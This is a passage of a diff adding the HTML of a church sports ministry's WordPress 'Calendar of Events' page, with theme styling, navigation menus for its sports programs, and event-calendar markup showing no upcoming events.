@@ -1,0 +1,550 @@
+
+<!DOCTYPE html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"  lang="en-US"> <!--<![endif]-->
+<head>
+
+    <meta charset="utf-8">
+	<!--[if lt IE 9]>   <link rel="stylesheet" type="text/css" href="https://wpcsportsministry.org/wp-content/themes/reverence/css/ie.css" /> <![endif]-->
+    <meta name="description" content="">
+	<meta name="author" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	
+    <title>WPC Sports Ministry &raquo; Calendar of Events</title>
+    
+	<link rel="alternate" type="application/rss+xml" title="RSS2.0" href="https://wpcsportsministry.org/feed/" />
+	<link rel="pingback" href="https://wpcsportsministry.org/xmlrpc.php" />
+	
+    <link rel="stylesheet" type="text/css"  media="all" href="https://wpcsportsministry.org/wp-content/themes/reverence/style.css" />
+    
+	<link href='http://fonts.googleapis.com/css?family=News+Cycle|PT+Sans:400,400italic,700,700italic' rel='stylesheet' type='text/css' />
+	<style type="text/css">@import url("http://fonts.googleapis.com/css?family=Yanone+Kaffeesatz");</style>
+		
+   	   
+      <!--[if lt IE 9]><script src="https://wpcsportsministry.org/wp-content/themes/reverence/js/html5.js"></script><![endif]-->
+
+	<style type="text/css">
+.header-wrapper{
+	 
+	 background-repeat:repeat;  
+		 background-color:#ffffff;  
+}
+
+
+
+#menu ul ul a{color:#ffffff}
+
+
+
+
+#header-top, .ei-slider, .tabs a:active, .tabs a:hover, .tabs a.current, .tabs a.current:hover,.cn-slideshow,.flexslider{
+	border-top-color: #4f2683}
+#social-icons a, .ei-slider-thumbs li,#carousel,.cn-slideshow,.flexslider,#carousel{
+	border-bottom-color: #4f2683}
+.sub-menu a:hover, .button, input[type="submit"],input[type="reset"], .car-prev,.textholder a,.list.type6 li:hover,.list.type2 li{
+	border-left-color: #4f2683}
+
+::-moz-selection, ::selection, #pricing-table .column:hover .table-head, #pricing-table .column.featured .table-head, .highlight, mark{ 
+	background: #4f2683;
+}
+
+.olist.type3 ol > li:before, .cn-nav a:hover span,.slider_button.orange,.sf-menu .sub-menu a:hover,.slider_button.red:hover, input[type="submit"]:hover, 
+input[type="reset"]:hover,.ei-slider-thumbs li a,.iview-caption.caption3, .step-box > span, #wp-calendar tbody td a { 
+	background-color:#4f2683;
+}
+.wpl-desc a, .tabs a, #wp-calendar tfoot a,.inner-divider span, .textSlider span,.more-link, #footer-menu a:hover, #twitter_update_list a,.list li a:hover, 
+.main-categories2 a:hover,#menu ul .current > a,  .current_page_parent > a, .current-menu-parent > a, 
+#breadcrumb li,.service-block h3 span,#options li a.current, #options li a:hover, .widget a,label.error,.sf-menu > li.top > a:hover, .sf-menu > li.top > a.active-item,
+.post-block a,.post-comment a, .post-author a,.content-block a,.tabs a:active, .tabs a:hover, .tabs a.current, .tabs a.current:hover,.wp-pagenavi span.current,
+.wp-pagenavi a:hover,.toggle > li a:hover, .toggle > li > a.active,.promo-text span,.blockquote p.author,#pricing-table h2 span,ol.commentlist li div.vcard cite.fn, 
+cite.fn a.url,#similar-posts li p,.cn-nav-content-current span,.post-comment a, .post-author,ol.commentlist li cite.fn, cite.fn a.url,.widget_archive li:hover a,
+div.toggle-trigger.active,.caption.very_big_orange,.caption.big_orange, caption span, .color, .commentlist a, #commentform a{
+	color:#4f2683 !important
+}/*.current-menu-item > a, .current_page_item > a,*/
+
+
+
+.sf-menu > li.top > a{font-size: 20px}
+body, p, ul#twitter_update_list li, .crumb_navigation ul a, .copyright, .widget ul li a{font-size: 15px}
+</style>    	<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="WPC Sports Ministry &raquo; Feed" href="https://wpcsportsministry.org/feed/" />
+<link rel="alternate" type="application/rss+xml" title="WPC Sports Ministry &raquo; Comments Feed" href="https://wpcsportsministry.org/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="WPC Sports Ministry &raquo; Calendar of Events Comments Feed" href="https://wpcsportsministry.org/events/calendar-of-events/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11.2.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11.2.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/wpcsportsministry.org\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.1.17"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])?!1:!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55358,56760,9792,65039],[55358,56760,8203,9792,65039])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='ai1ec_style-css'  href='//wpcsportsministry.org/wp-content/plugins/all-in-one-event-calendar/cache/da11bc39_ai1ec_parsed_css.css?ver=2.1.8' type='text/css' media='all' />
+<link rel='stylesheet' id='pretty-photo-styles-css'  href='https://wpcsportsministry.org/wp-content/themes/reverence/css/prettyPhoto.css?ver=5.1.17' type='text/css' media='all' />
+<link rel='stylesheet' id='jplayer-styles-css'  href='https://wpcsportsministry.org/wp-content/themes/reverence/js/jplayer/skin/blue.monday/jplayer.blue.monday.css?ver=3.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='flex-styles-css'  href='https://wpcsportsministry.org/wp-content/themes/reverence/sliders/flex/flexslider.css?ver=5.1.17' type='text/css' media='all' />
+<link rel='stylesheet' id='camera-styles-css'  href='https://wpcsportsministry.org/wp-content/themes/reverence/sliders/camera/css/camera.css?ver=5.1.17' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-block-library-css'  href='https://wpcsportsministry.org/wp-includes/css/dist/block-library/style.min.css?ver=5.1.17' type='text/css' media='all' />
+<link rel='stylesheet' id='socials-ignited-css'  href='https://wpcsportsministry.org/wp-content/plugins/socials-ignited/css/style.css?ver=5.1.17' type='text/css' media='all' />
+<link rel='stylesheet' id='svegliat-buttons-css'  href='https://wpcsportsministry.org/wp-content/plugins/svegliat-buttons/stylebuttons.css?ver=5.1.17' type='text/css' media='all' />
+<link rel='stylesheet' id='sccss_style-css'  href='https://wpcsportsministry.org?sccss=1&#038;ver=5.1.17' type='text/css' media='all' />
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/js/jquery.prettyPhoto.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/js/menu.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/js/jquery.isotope.min.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/js/jquery.carouFredSel-6.1.0-packed.js?ver=3.0.1'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/sliders/flex/js/jquery.fitvid.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/sliders/flex/js/jquery.flexslider-min.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/sliders/flex/js/froogaloop.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/sliders/flex/js/modernizr.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/js/jquery.mobilemenu.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/js/jquery.tools.min.js?ver=1.2.6'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/js/jplayer/jquery.jplayer.min.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/js/custom.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/sliders/camera/js/camera.min.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/themes/reverence/sliders/camera/js/jquery.mobile.customized.min.js?ver=5.1.17'></script>
+<script type='text/javascript' src='https://wpcsportsministry.org/wp-content/plugins/mailchimp-widget/js/mailchimp-widget-min.js?ver=5.1.17'></script>
+<link rel='https://api.w.org/' href='https://wpcsportsministry.org/wp-json/' />
+<link rel="canonical" href="https://wpcsportsministry.org/events/calendar-of-events/" />
+<link rel='shortlink' href='https://wpcsportsministry.org/?p=317' />
+<link rel="alternate" type="application/json+oembed" href="https://wpcsportsministry.org/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwpcsportsministry.org%2Fevents%2Fcalendar-of-events%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://wpcsportsministry.org/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwpcsportsministry.org%2Fevents%2Fcalendar-of-events%2F&#038;format=xml" />
+</head>
+
+<body  class="page-template-default page page-id-317 page-child parent-pageid-82">
+
+
+
+<!-- BEGIN Top bar -->
+   
+<!-- END TOP bar -->
+
+<!-- BEGIN Header -->
+<div class="header-wrapper"> 
+	<header class="container">        
+		<!--Logo-->
+		<div id="logo" class="four columns">
+			
+			<a href="https://wpcsportsministry.org">
+									<img src="https://wpcsportsministry.org/wp-content/uploads/2013/02/Logo2.png" alt="" id="logo-image" />
+							</a>
+			
+		</div>
+		<nav class="twelve columns last">       
+			<ul id="menu-navigation" class="sf-menu"><li id="menu-item-9" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-9"><a href="https://wpcsportsministry.org/">Home</a></li>
+<li id="menu-item-78" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-78"><a href="https://wpcsportsministry.org/about/">About</a>
+<ul class="sub-menu">
+	<li id="menu-item-81" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81"><a href="https://wpcsportsministry.org/about/sports-ministry-board/">Sports Ministry Board</a></li>
+	<li id="menu-item-80" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-80"><a href="https://wpcsportsministry.org/about/articles/">Articles</a></li>
+	<li id="menu-item-79" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-79"><a href="https://wpcsportsministry.org/about/testimonials/">Testimonials</a></li>
+	<li id="menu-item-95" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-95"><a href="https://wpcsportsministry.org/about/wsm-professional-network/">WSM Professional Network</a></li>
+	<li id="menu-item-610" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-610"><a href="https://wpcsportsministry.org/about/affiliated-churches/">Affiliated Churches</a></li>
+	<li id="menu-item-615" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-615"><a href="https://wpcsportsministry.org/about/other-youth-organizations/">Other Youth Organizations</a></li>
+</ul>
+</li>
+<li id="menu-item-87" class="menu-item menu-item-type-post_type menu-item-object-page current-page-ancestor current-menu-ancestor current-menu-parent current-page-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-87"><a href="https://wpcsportsministry.org/events/">Events</a>
+<ul class="sub-menu">
+	<li id="menu-item-88" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-88"><a href="https://wpcsportsministry.org/events/sports-ministry-events/">Sports Ministry Events</a></li>
+	<li id="menu-item-96" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-96"><a href="https://wpcsportsministry.org/events/winterburg-church/">Wintersburg Church Events</a></li>
+	<li id="menu-item-319" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-317 current_page_item menu-item-319"><a href="https://wpcsportsministry.org/events/calendar-of-events/" aria-current="page">Calendar of Events</a></li>
+</ul>
+</li>
+<li id="menu-item-122" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-122"><a href="https://wpcsportsministry.org/wpc-basketball/">WPC Basketball</a>
+<ul class="sub-menu">
+	<li id="menu-item-534" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-534"><a href="https://wpcsportsministry.org/wpc-basketball/gym-calendar/">Gym Calendar</a></li>
+	<li id="menu-item-464" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-464"><a href="https://wpcsportsministry.org/wpc-basketball/tournaments/">Tournaments</a></li>
+	<li id="menu-item-475" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-475"><a href="https://wpcsportsministry.org/wpc-basketball/team-information/">Team Information</a></li>
+	<li id="menu-item-479" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-479"><a href="https://wpcsportsministry.org/wpc-basketball/girls-summer-league/">Girls Summer League</a></li>
+	<li id="menu-item-344" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-344"><a href="https://wpcsportsministry.org/wpc-basketball/little-hoopsters-2/">Little Hoopsters</a></li>
+	<li id="menu-item-341" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-341"><a href="https://wpcsportsministry.org/wpc-basketball/coaches-club/">Coaches Club</a></li>
+	<li id="menu-item-251" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-251"><a href="https://wpcsportsministry.org/wpc-basketball/team-parents/">Team Rep Club</a></li>
+	<li id="menu-item-593" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-593"><a href="https://wpcsportsministry.org/wpc-basketball/recognition/">Recognition</a></li>
+	<li id="menu-item-170" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-170"><a href="https://wpcsportsministry.org/wpc-basketball/forms/">Forms</a></li>
+</ul>
+</li>
+<li id="menu-item-238" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-238"><a href="https://wpcsportsministry.org/sports-2/">Sports</a>
+<ul class="sub-menu">
+	<li id="menu-item-121" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-121"><a href="https://wpcsportsministry.org/sports-2/baseball/">Baseball</a></li>
+	<li id="menu-item-120" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-120"><a href="https://wpcsportsministry.org/wpc-basketball/bowling/">Bowling</a></li>
+	<li id="menu-item-119" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-119"><a href="https://wpcsportsministry.org/sports-2/fishing/">Fishing</a></li>
+	<li id="menu-item-118" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-118"><a href="https://wpcsportsministry.org/sports-2/golf/">Golf</a></li>
+	<li id="menu-item-117" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-117"><a href="https://wpcsportsministry.org/sports-2/volleyball/">Volleyball</a></li>
+</ul>
+</li>
+<li id="menu-item-8" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8"><a href="https://wpcsportsministry.org/gallery/">Gallery</a></li>
+<li id="menu-item-104" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-104"><a href="https://wpcsportsministry.org/contact/">Contact</a></li>
+</ul>		 </nav>
+		 <div class="clear"></div>
+	</header>
+</div><div id="content-wrapper">	
+	<div class="container">
+    	<div class="sixteen columns">
+        	<div id="content-top">
+               <ul id="breadcrumb" class="twelve columns alpha"><li class="home"><a href="https://wpcsportsministry.org">Home</a></li><li><a href="https://wpcsportsministry.org/events/">Events</a></li><li>Calendar of Events </li></ul>               <div class="four columns last" id="search-global">
+                    <form action="https://wpcsportsministry.org" method="get" id="search-global-form">   
+   	 <div>
+		<input type="text" name="s" id="search" title="Search terms" value="" />
+   		<input type="submit" value="" name="search" />
+	</div>
+    <div class="clear"></div>
+</form>                </div>
+            </div> 
+			<div class="medium_separator"></div>				
+        </div>
+        <div class="clear"></div>
+								<div class="sixteen columns">
+				<!-- START All-in-One Event Calendar Plugin - Version 2.1.8 -->
+<div id="ai1ec-container" class="ai1ec-main-container ">
+	
+	<div id="ai1ec-calendar" class="timely ai1ec-calendar">
+				<div class="timely ai1ec-calendar-toolbar ai1ec-clearfix
+	">
+	<ul class="ai1ec-nav ai1ec-nav-pills ai1ec-pull-left ai1ec-filters">
+		<li class="ai1ec-dropdown ai1ec-category-filter
+	ai1ec-active">
+	<a class="ai1ec-dropdown-toggle" data-toggle="ai1ec-dropdown">
+		<i class="ai1ec-fa ai1ec-fa-folder-open"></i>
+		<span class="ai1ec-clear-filter ai1ec-tooltip-trigger"
+			data-href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/request_format~html/"
+			data-type="json"
+			title="Clear category filter">
+			<i class="ai1ec-fa ai1ec-fa-times-circle"></i>
+		</span>
+		Categories
+		<span class="ai1ec-caret"></span>
+	</a>
+	<div class="ai1ec-dropdown-menu">
+					<div data-term="6"
+				>
+				<a class="ai1ec-load-view ai1ec-category"
+											title="This&#x20;is&#x20;for&#x20;this&#x20;upcoming&#x20;Golf&#x20;Tournament"
+										data-type="json"
+					href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/cat_ids~61312101113129896,10,6/request_format~html/">
+											<span class="ai1ec-color-swatch ai1ec-tooltip-trigger" style="background:#008800" title="Golf Tournament"></span>
+										Golf Tournament
+				</a>
+			</div>
+					<div data-term="9"
+				>
+				<a class="ai1ec-load-view ai1ec-category"
+										data-type="json"
+					href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/cat_ids~61312101113129896,10,9/request_format~html/">
+											<span class="ai1ec-color-swatch ai1ec-tooltip-trigger" style="background:#22bb00" title="Main Events"></span>
+										Main Events
+				</a>
+			</div>
+					<div data-term="13"
+				>
+				<a class="ai1ec-load-view ai1ec-category"
+										data-type="json"
+					href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/cat_ids~61312101113129896,10,13/request_format~html/">
+											<span class="ai1ec-color-swatch ai1ec-tooltip-trigger" style="background:#10827a" title="Other Basketball Tournaments"></span>
+										Other Basketball Tournaments
+				</a>
+			</div>
+					<div data-term="12"
+				>
+				<a class="ai1ec-load-view ai1ec-category"
+										data-type="json"
+					href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/cat_ids~61312101113129896,10,12/request_format~html/">
+											<span class="ai1ec-color-swatch ai1ec-tooltip-trigger" style="background:#ff9500" title="SEYO Events"></span>
+										SEYO Events
+				</a>
+			</div>
+					<div data-term="10"
+									class="ai1ec-active"
+				>
+				<a class="ai1ec-load-view ai1ec-category"
+										data-type="json"
+					href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/cat_ids~61312101113129896/request_format~html/">
+											<span class="ai1ec-color-swatch ai1ec-tooltip-trigger" style="background:#6600aa" title="Sports Ministry Events"></span>
+										Sports Ministry Events
+				</a>
+			</div>
+					<div data-term="11"
+				>
+				<a class="ai1ec-load-view ai1ec-category"
+										data-type="json"
+					href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/cat_ids~61312101113129896,10,11/request_format~html/">
+											<span class="ai1ec-color-swatch ai1ec-tooltip-trigger" style="background:#59bfff" title="Wintersburg Church Events"></span>
+										Wintersburg Church Events
+				</a>
+			</div>
+					<div data-term="8"
+				>
+				<a class="ai1ec-load-view ai1ec-category"
+											title="Special&#x20;K&#x20;and&#x20;Ike&#x20;Pono"
+										data-type="json"
+					href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/cat_ids~61312101113129896,10,8/request_format~html/">
+											<span class="ai1ec-color-swatch ai1ec-tooltip-trigger" style="background:#8855ee" title="WPC Youth Groups"></span>
+										WPC Youth Groups
+				</a>
+			</div>
+			</div>
+</li>
+
+
+		
+			</ul>
+  <div class="ai1ec-pull-right">
+  	
+  </div>
+</div>
+
+		<div id="ai1ec-calendar-view-container" class="ai1ec-calendar-view-container">
+			<div id="ai1ec-calendar-view-loading" class="ai1ec-loading ai1ec-calendar-view-loading"></div>
+			<div id="ai1ec-calendar-view" class="ai1ec-calendar-view">
+				<div class="ai1ec-clearfix">
+		<div class="ai1ec-views-dropdown ai1ec-btn-group ai1ec-pull-right">
+		<a class="ai1ec-btn ai1ec-btn-sm ai1ec-btn-default ai1ec-dropdown-toggle"
+			data-toggle="ai1ec-dropdown">
+			<i class="ai1ec-icon-agenda ai1ec-view-icon ai1ec-tooltip-trigger"
+				title="Agenda"
+				data-placement="left"></i>
+			<span class="ai1ec-hidden-xs ai1ec-hidden-sm">
+				Agenda
+			</span>
+			<span class="ai1ec-caret"></span>
+		</a>
+		<div class="ai1ec-dropdown-menu">
+							<div class="ai1ec-active"
+					data-action="agenda">
+					<a id="ai1ec-view-agenda"
+						data-type="json"
+						class="ai1ec-load-view agenda"
+						href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/cat_ids~61312101113129896,10/request_format~html/">
+						<i class="ai1ec-icon-agenda ai1ec-view-icon ai1ec-tooltip-trigger"
+							title="Agenda"
+							data-placement="left"></i>
+						<span class="ai1ec-hidden-xs ai1ec-hidden-sm">
+							Agenda
+						</span>
+					</a>
+				</div>
+							<div class=""
+					data-action="oneday">
+					<a id="ai1ec-view-oneday"
+						data-type="json"
+						class="ai1ec-load-view oneday"
+						href="https://wpcsportsministry.org/events/calendar-of-events/action~oneday/cat_ids~61312101113129896,10/request_format~html/">
+						<i class="ai1ec-icon-oneday ai1ec-view-icon ai1ec-tooltip-trigger"
+							title="Day"
+							data-placement="left"></i>
+						<span class="ai1ec-hidden-xs ai1ec-hidden-sm">
+							Day
+						</span>
+					</a>
+				</div>
+							<div class=""
+					data-action="month">
+					<a id="ai1ec-view-month"
+						data-type="json"
+						class="ai1ec-load-view month"
+						href="https://wpcsportsministry.org/events/calendar-of-events/action~month/cat_ids~61312101113129896,10/request_format~html/">
+						<i class="ai1ec-icon-month ai1ec-view-icon ai1ec-tooltip-trigger"
+							title="Month"
+							data-placement="left"></i>
+						<span class="ai1ec-hidden-xs ai1ec-hidden-sm">
+							Month
+						</span>
+					</a>
+				</div>
+							<div class=""
+					data-action="week">
+					<a id="ai1ec-view-week"
+						data-type="json"
+						class="ai1ec-load-view week"
+						href="https://wpcsportsministry.org/events/calendar-of-events/action~week/cat_ids~61312101113129896,10/request_format~html/">
+						<i class="ai1ec-icon-week ai1ec-view-icon ai1ec-tooltip-trigger"
+							title="Week"
+							data-placement="left"></i>
+						<span class="ai1ec-hidden-xs ai1ec-hidden-sm">
+							Week
+						</span>
+					</a>
+				</div>
+					</div>
+	</div>
+
+	<div class="ai1ec-title-buttons ai1ec-btn-toolbar">
+		
+		<div class="ai1ec-pagination ai1ec-btn-group">
+						<a class="ai1ec-prev-page ai1ec-load-view ai1ec-btn ai1ec-btn-sm
+				ai1ec-btn-default "
+				data-type="json"
+				href="https&#x3A;&#x2F;&#x2F;wpcsportsministry.org&#x2F;events&#x2F;calendar-of-events&#x2F;action&#x7E;agenda&#x2F;page_offset&#x7E;-1&#x2F;time_limit&#x7E;9223372036854745215&#x2F;cat_ids&#x7E;61312101113129896,10&#x2F;request_format&#x7E;html&#x2F;">
+				<i class="ai1ec-fa ai1ec-fa-chevron-left"></i>
+			</a>
+								<a
+	class="ai1ec-minical-trigger ai1ec-btn ai1ec-btn-sm ai1ec-btn-default
+    ai1ec-tooltip-trigger"
+			data-date="12/6/2023"
+			data-date-format="m/d/yyyy"
+			data-date-weekstart="0"
+			href="#"
+			data-href="https://wpcsportsministry.org/events/calendar-of-events/action~agenda/exact_date~__DATE__/cat_ids~61312101113129896,10/"
+			data-lang="en-US"
+		data-type="json"
+	title="Choose a date using calendar"
+	>
+	<i class="ai1ec-fa ai1ec-fa-calendar-o ai1ec-fa-fw ai1ec-fa-lg"></i>
+  <span class="ai1ec-calendar-title"> </span>
+  <span class="ai1ec-calendar-title-short"> </span>
+</a>
+
+								<a class="ai1ec-next-page ai1ec-load-view ai1ec-btn ai1ec-btn-sm
+				ai1ec-btn-default "
+				data-type="json"
+				href="https&#x3A;&#x2F;&#x2F;wpcsportsministry.org&#x2F;events&#x2F;calendar-of-events&#x2F;action&#x7E;agenda&#x2F;page_offset&#x7E;1&#x2F;time_limit&#x7E;9223372036854745217&#x2F;cat_ids&#x7E;61312101113129896,10&#x2F;request_format&#x7E;html&#x2F;">
+				<i class="ai1ec-fa ai1ec-fa-chevron-right"></i>
+			</a>
+			</div>
+
+		
+	</div>
+</div>
+
+
+<div class="ai1ec-agenda-view">
+			<p class="ai1ec-no-results">
+			There are no upcoming events to display at this time.
+		</p>
+	 </div>
+
+<div class="ai1ec-pull-left"></div>
+
+			</div>
+		</div>
+
+		<div class="ai1ec-pull-right"><div class="ai1ec-subscribe-container ai1ec-btn-group ai1ec-pull-left
+		ai1ec-tooltip-trigger" data-placement="left" title="Subscribe in your personal calendar">
+	<button
+		type="button"
+		class="ai1ec-btn ai1ec-btn-default ai1ec-btn-sm ai1ec-dropdown-toggle
+			ai1ec-subscribe "
+			data-toggle="ai1ec-dropdown">
+		<i class="ai1ec-fa ai1ec-icon-rss ai1ec-fa-lg ai1ec-fa-fw"></i>
+		<span class="ai1ec-hidden-xs">
+			<span class="ai1ec-hidden-xs">
+												Subscribe to filtered calendar
+										</span>
+			<span class="ai1ec-caret"></span>
+		</span>
+	</button>
+		<ul class="ai1ec-dropdown-menu ai1ec-pull-right" role="menu">
+		<li>
+			<a class="ai1ec-tooltip-trigger ai1ec-tooltip-auto"
+			   target="_blank"
+			   data-placement="left"
+			   href="https&#x3A;&#x2F;&#x2F;wpcsportsministry.org&#x2F;&#x3F;plugin&#x3D;all-in-one-event-calendar&amp;controller&#x3D;ai1ec_exporter_controller&amp;action&#x3D;export_events&amp;ai1ec_cat_ids&#x3D;61312101113129896,10"
+			   title="Copy this URL for your own Timely calendar or click to add to your rich-text calendar" >
+				<i class="ai1ec-fa ai1ec-fa-lg ai1ec-fa-fw ai1ec-icon-timely"></i>
+				Add to Timely Calendar
+			</a>
+		</li>
+		<li>
+			<a class="ai1ec-tooltip-trigger ai1ec-tooltip-auto"
+			   target="_blank"
+			   data-placement="left"
+			   href="http://www.google.com/calendar/render?cid=https&#x25;3A&#x25;2F&#x25;2Fwpcsportsministry.org&#x25;2F&#x25;3Fplugin&#x25;3Dall-in-one-event-calendar&#x25;26controller&#x25;3Dai1ec_exporter_controller&#x25;26action&#x25;3Dexport_events&#x25;26ai1ec_cat_ids&#x25;3D61312101113129896&#x25;2C10"
+			   title="Subscribe to this calendar in your Google Calendar" >
+				<i class="ai1ec-fa ai1ec-icon-google ai1ec-fa-lg ai1ec-fa-fw"></i>
+				Add to Google
+			</a>
+		</li>
+		<li>
+			<a class="ai1ec-tooltip-trigger ai1ec-tooltip-auto"
+			   target="_blank"
+			   data-placement="left"
+			   href="https&#x3A;&#x2F;&#x2F;wpcsportsministry.org&#x2F;&#x3F;plugin&#x3D;all-in-one-event-calendar&amp;controller&#x3D;ai1ec_exporter_controller&amp;action&#x3D;export_events&amp;no_html&#x3D;true&amp;ai1ec_cat_ids&#x3D;61312101113129896,10"
+			   title="Subscribe to this calendar in MS Outlook" >
+				<i class="ai1ec-fa ai1ec-icon-windows ai1ec-fa-lg ai1ec-fa-fw"></i>
+				Add to Outlook
+			</a>
+		</li>
+		<li>
+			<a class="ai1ec-tooltip-trigger ai1ec-tooltip-auto"
+			   target="_blank"
+			   data-placement="left"
+			   href="https&#x3A;&#x2F;&#x2F;wpcsportsministry.org&#x2F;&#x3F;plugin&#x3D;all-in-one-event-calendar&amp;controller&#x3D;ai1ec_exporter_controller&amp;action&#x3D;export_events&amp;no_html&#x3D;true&amp;ai1ec_cat_ids&#x3D;61312101113129896,10"
+			   title="Subscribe to this calendar in Apple Calendar/iCal" >
+				<i class="ai1ec-fa ai1ec-icon-apple ai1ec-fa-lg ai1ec-fa-fw"></i>
+				Add to Apple Calendar
+			</a>
+		</li>
+		<li>
+						<a class="ai1ec-tooltip-trigger ai1ec-tooltip-auto"
+			   data-placement="left"
